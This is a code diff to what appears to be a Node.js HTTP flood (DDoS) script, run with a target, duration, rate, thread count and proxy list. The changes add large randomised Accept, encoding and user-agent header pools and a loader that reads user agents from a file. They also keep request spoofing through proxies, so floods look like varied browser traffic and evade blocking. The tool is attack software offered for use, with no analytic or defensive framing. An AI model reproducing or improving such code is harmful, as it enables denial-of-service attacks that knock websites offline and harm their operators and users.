@@ -9,7 +9,31 @@ const net = require("net");
 
  lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
-encoding_header = [
+ accept_header = [
+    'application/json',
+  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
+    'text/html; charset=utf-8',
+    'application/json, text/plain, */*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+  ],
+ encoding_header = [
 'gzip, deflate, br',
 'compress, gzip',
 'deflate, gzip',
@@ -24,7 +48,8 @@ encoding_header = [
  process.on('uncaughtException', function (exception) {
   });
 
- if (process.argv.length < 7){console.log(`node ox.js target time rate thread proxy.txt`); process.exit();}
+  if (process.argv.length < 7){console.log(`node tls target time rate threads proxy`.rainbow); process.exit();}
+
  const headers = {};
   function readLines(filePath) {
      return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -152,6 +177,10 @@ function getRandomUserAgent() {
     return finalString;
   }
 
+  function UserAgents() {
+    const userAgents = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/);
+    return userAgents[Math.floor(Math.random() * userAgents.length)];
+  }
 
   const Header = new NetSocket();
   headers[":method"] = "GET";
@@ -174,7 +203,8 @@ function getRandomUserAgent() {
      const parsedProxy = proxyAddr.split(":");
      headers[":authority"] = parsedTarget.host
      headers["user-agent"] = getRandomUserAgent();
- 
+     headers["user-agents"] = UserAgents();
+
      const proxyOptions = {
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
